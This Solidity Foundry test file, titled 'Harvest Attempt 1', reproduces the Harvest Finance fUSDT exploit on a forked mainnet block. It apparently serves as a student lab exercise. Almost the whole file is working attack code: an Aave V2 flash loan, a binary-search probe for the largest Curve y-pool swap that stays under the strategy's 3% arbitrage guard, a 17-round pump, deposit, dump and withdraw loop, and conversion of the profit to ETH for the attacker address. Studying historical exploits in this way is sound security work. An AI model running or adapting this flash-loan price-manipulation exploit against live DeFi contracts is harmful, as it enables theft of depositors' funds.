// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAaveV2LendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
}

interface ICurveStrategy {
    function depositArbCheck() external view returns (bool);
    function investedUnderlyingBalance() external view returns (uint256);
    function curvePriceCheckpoint() external view returns (uint256);
    function underlyingValueFromYCrv(uint256 ycrvBalance) external view returns (uint256);
    function arbTolerance() external view returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

/// @title Harvest Attempt 1
/// @notice Hypothesis: Harvest's fUSDT share minting can be amplified by nudging
/// Curve's y-pool price up to, but not through, the strategy's ±3% arb guard.
/// This attempt uses an Aave V2 multi-asset flash loan for USDC+USDT, loops the
/// historical pump/deposit/dump/withdraw sequence at N=17, and converts any
/// stablecoin excess to native ETH for the student EOA.
contract Attempt1 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    IAaveV2LendingPool constant AAVE_V2 = IAaveV2LendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IHVault constant FUSDT_VAULT = IHVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    ICurveStrategy constant STRATEGY = ICurveStrategy(0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c);
    ICurveYPool constant CURVE_YPOOL = ICurveYPool(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IUniswapV2Router02 constant UNISWAP_V2 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    int128 constant IDX_USDC = 1;
    int128 constant IDX_USDT = 2;

    uint256 constant FORK_BLOCK = 11_128_633;
    uint256 constant ITERATIONS = 17;
    uint256 constant PROBE_LOW = 250_000e6;
    uint256 constant PROBE_HIGH = 20_000_000e6;
    uint256 constant YCRV_UNIT = 1e18;

    uint256 internal swapSize;
    uint256 internal flashUsdc;
    uint256 internal flashUsdt;

    function setUp() public {
        vm.createSelectFork("ch2", FORK_BLOCK);
        vm.label(ATTACKER, "StudentEOA");
        vm.label(address(AAVE_V2), "AaveV2");
        vm.label(address(FUSDT_VAULT), "Harvest_fUSDT");
        vm.label(address(STRATEGY), "HarvestStrategy");
        vm.label(address(CURVE_YPOOL), "Curve_yPool");
        vm.label(USDC, "USDC");
        vm.label(USDT, "USDT");
        vm.label(WETH, "WETH");

        vm.deal(ATTACKER, 1 ether);
        _forceApprove(USDC, address(CURVE_YPOOL), type(uint256).max);
        _forceApprove(USDT, address(CURVE_YPOOL), type(uint256).max);
        _forceApprove(USDT, address(FUSDT_VAULT), type(uint256).max);
        _forceApprove(USDC, address(UNISWAP_V2), type(uint256).max);
        _forceApprove(USDT, address(UNISWAP_V2), type(uint256).max);
    }

    function test_exploit() public {
        console.log("[pre] chainId:", block.chainid);
        console.log("[pre] fork block:", block.number);
        console.log("[pre] checkpoint:", STRATEGY.curvePriceCheckpoint());
        console.log("[pre] spot:", STRATEGY.underlyingValueFromYCrv(YCRV_UNIT));
        console.log("[pre] arbTolerance:", STRATEGY.arbTolerance());
        console.log("[pre] depositArbCheck:", STRATEGY.depositArbCheck());
        console.log("[pre] vault underlying:", FUSDT_VAULT.underlyingBalanceWithInvestment());
        console.log("[pre] vault PPS:", FUSDT_VAULT.getPricePerFullShare());
        console.log("[pre] strategy invested:", STRATEGY.investedUnderlyingBalance());

        swapSize = _probeMaxSafeSwapSize(PROBE_LOW, PROBE_HIGH);
        flashUsdc = swapSize;
        flashUsdt = FUSDT_VAULT.underlyingBalanceWithInvestment() / 4;
        if (flashUsdt < 5_000_000e6) flashUsdt = 5_000_000e6;
        if (flashUsdt > 30_000_000e6) flashUsdt = 30_000_000e6;

        console.log("[tune] swapSize:", swapSize);
        console.log("[tune] flashUsdc:", flashUsdc);
        console.log("[tune] flashUsdt:", flashUsdt);

        _previewLoopEconomics();

        uint256 nativeBefore = ATTACKER.balance;
        console.log("[start] attacker ETH:", nativeBefore);

        vm.startPrank(ATTACKER);
        _startFlashLoan();
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker ETH:", nativeAfter);
        console.log("[delta] attacker ETH:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "native balance must strictly increase");
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V2), "bad lender");
        require(initiator == address(this), "bad initiator");
        require(assets.length == 2, "unexpected assets");

        uint256 usdcOwed;
        uint256 usdtOwed;

        for (uint256 i; i < assets.length; ++i) {
            if (assets[i] == USDC) {
                usdcOwed = amounts[i] + premiums[i];
            } else if (assets[i] == USDT) {
                usdtOwed = amounts[i] + premiums[i];
            } else {
                revert("unknown flash asset");
            }
        }

        console.log("[flash] usdc borrowed:", amounts[0] == flashUsdc ? amounts[0] : amounts[1]);
        console.log("[flash] usdt borrowed:", amounts[0] == flashUsdt ? amounts[0] : amounts[1]);
        console.log("[flash] usdc owed:", usdcOwed);
        console.log("[flash] usdt owed:", usdtOwed);

        _runLoop(ITERATIONS, swapSize, flashUsdt);
        _rebalanceForRepayment(usdcOwed, usdtOwed);

        uint256 usdcBal = IERC20Like(USDC).balanceOf(address(this));
        uint256 usdtBal = IERC20Like(USDT).balanceOf(address(this));

        console.log("[post-loop] usdc balance:", usdcBal);
        console.log("[post-loop] usdt balance:", usdtBal);
        require(usdcBal >= usdcOwed, "USDC shortfall");
        require(usdtBal >= usdtOwed, "USDT shortfall");

        uint256 usdcProfit = usdcBal - usdcOwed;
        uint256 usdtProfit = usdtBal - usdtOwed;
        console.log("[profit] usdc excess:", usdcProfit);
        console.log("[profit] usdt excess:", usdtProfit);

        _swapStableProfitToEth(usdcProfit, usdtProfit);

        _forceApprove(USDC, address(AAVE_V2), usdcOwed);
        _forceApprove(USDT, address(AAVE_V2), usdtOwed);
        return true;
    }

    receive() external payable {}

    function _startFlashLoan() internal {
        address[] memory assets = new address[](2);
        assets[0] = USDC;
        assets[1] = USDT;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = flashUsdc;
        amounts[1] = flashUsdt;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        AAVE_V2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
    }

    function _previewLoopEconomics() internal {
        uint256 snapshot = vm.snapshotState();

        deal(USDC, address(this), flashUsdc);
        deal(USDT, address(this), flashUsdt);

        uint256 usdcBefore = IERC20Like(USDC).balanceOf(address(this));
        uint256 usdtBefore = IERC20Like(USDT).balanceOf(address(this));
        uint256 ppsBefore = FUSDT_VAULT.getPricePerFullShare();

        console.log("[preview] usdc before:", usdcBefore);
        console.log("[preview] usdt before:", usdtBefore);
        console.log("[preview] pps before:", ppsBefore);

        _runLoop(1, swapSize, flashUsdt);

        console.log("[preview] usdc after one iter:", IERC20Like(USDC).balanceOf(address(this)));
        console.log("[preview] usdt after one iter:", IERC20Like(USDT).balanceOf(address(this)));
        console.log("[preview] pps after one iter:", FUSDT_VAULT.getPricePerFullShare());

        require(vm.revertToStateAndDelete(snapshot), "preview revert failed");
    }

    function _runLoop(uint256 iterations, uint256 swapAmount, uint256 depositAmount) internal {
        for (uint256 i; i < iterations; ++i) {
            uint256 sharesBefore = FUSDT_VAULT.balanceOf(address(this));
            uint256 ppsBefore = FUSDT_VAULT.getPricePerFullShare();

            CURVE_YPOOL.exchange_underlying(IDX_USDC, IDX_USDT, swapAmount, 0);
            require(STRATEGY.depositArbCheck(), "swap tripped arb guard");

            FUSDT_VAULT.deposit(depositAmount);
            uint256 sharesMinted = FUSDT_VAULT.balanceOf(address(this)) - sharesBefore;

            CURVE_YPOOL.exchange_underlying(IDX_USDT, IDX_USDC, swapAmount, 0);
            FUSDT_VAULT.withdraw(sharesMinted);

            console.log("[iter] index:", i);
            console.log("[iter] shares minted:", sharesMinted);
            console.log("[iter] pps before:", ppsBefore);
            console.log("[iter] pps after:", FUSDT_VAULT.getPricePerFullShare());
            console.log("[iter] usdc bal:", IERC20Like(USDC).balanceOf(address(this)));
            console.log("[iter] usdt bal:", IERC20Like(USDT).balanceOf(address(this)));
        }
    }

    function _probeMaxSafeSwapSize(uint256 low, uint256 high) internal returns (uint256 best) {
        best = low;

        while (low <= high) {
            uint256 mid = low + ((high - low) / 2);
            (bool success, bool arbOk, uint256 spot) = _simulatePump(mid);

            console.log("[probe] amount:", mid);
            console.log("[probe] call success:", success);
            console.log("[probe] arb ok:", arbOk);
            console.log("[probe] spot:", spot);

            if (success && arbOk) {
                best = mid;
                low = mid + 1;
            } else {
                if (mid == 0) break;
                high = mid - 1;
            }
        }
    }

    function _simulatePump(uint256 amount) internal returns (bool success, bool arbOk, uint256 spot) {
        uint256 snapshot = vm.snapshotState();

        deal(USDC, address(this), amount);
        (success,) = address(CURVE_YPOOL).call(
            abi.encodeWithSelector(ICurveYPool.exchange_underlying.selector, IDX_USDC, IDX_USDT, amount, 0)
        );

        if (success) {
            arbOk = STRATEGY.depositArbCheck();
            spot = STRATEGY.underlyingValueFromYCrv(YCRV_UNIT);
        }

        require(vm.revertToStateAndDelete(snapshot), "probe revert failed");
    }

    function _rebalanceForRepayment(uint256 usdcOwed, uint256 usdtOwed) internal {
        uint256 usdcBal = IERC20Like(USDC).balanceOf(address(this));
        uint256 usdtBal = IERC20Like(USDT).balanceOf(address(this));

        if (usdcBal < usdcOwed) {
            uint256 deficit = usdcOwed - usdcBal;
            uint256 usdtIn = _findInputForOutput(IDX_USDT, IDX_USDC, deficit, 1e6, usdtBal);
            console.log("[rebalance] usdc deficit:", deficit);
            console.log("[rebalance] usdt in:", usdtIn);
            CURVE_YPOOL.exchange_underlying(IDX_USDT, IDX_USDC, usdtIn, 0);
        }

        usdcBal = IERC20Like(USDC).balanceOf(address(this));
        usdtBal = IERC20Like(USDT).balanceOf(address(this));
        if (usdtBal < usdtOwed) {
            uint256 deficit = usdtOwed - usdtBal;
            uint256 usdcIn = _findInputForOutput(IDX_USDC, IDX_USDT, deficit, 1e6, usdcBal);
            console.log("[rebalance] usdt deficit:", deficit);
            console.log("[rebalance] usdc in:", usdcIn);
            CURVE_YPOOL.exchange_underlying(IDX_USDC, IDX_USDT, usdcIn, 0);
        }
    }

    function _findInputForOutput(
        int128 tokenIn,
        int128 tokenOut,
        uint256 desiredOut,
        uint256 low,
        uint256 high
    ) internal view returns (uint256 best) {
        best = high;
        while (low <= high) {
            uint256 mid = low + ((high - low) / 2);
            uint256 out = CURVE_YPOOL.get_dy_underlying(tokenIn, tokenOut, mid);
            if (out >= desiredOut) {
                best = mid;
                if (mid == 0) break;
                high = mid - 1;
            } else {
                low = mid + 1;
            }
        }
    }

    function _swapStableProfitToEth(uint256 usdcProfit, uint256 usdtProfit) internal {
        if (usdcProfit > 0) {
            address[] memory usdcPath = new address[](2);
            usdcPath[0] = USDC;
            usdcPath[1] = WETH;
            UNISWAP_V2.swapExactTokensForETH(usdcProfit, 0, usdcPath, ATTACKER, block.timestamp + 60);
        }

        if (usdtProfit > 0) {
            address[] memory usdtPath = new address[](2);
            usdtPath[0] = USDT;
            usdtPath[1] = WETH;
            UNISWAP_V2.swapExactTokensForETH(usdtProfit, 0, usdtPath, ATTACKER, block.timestamp + 60);
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0), "approve reset");
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount), "approve set");
    }

    function _callOptionalReturn(address token, bytes memory data, string memory err) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, err);
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), err);
        }
    }
}
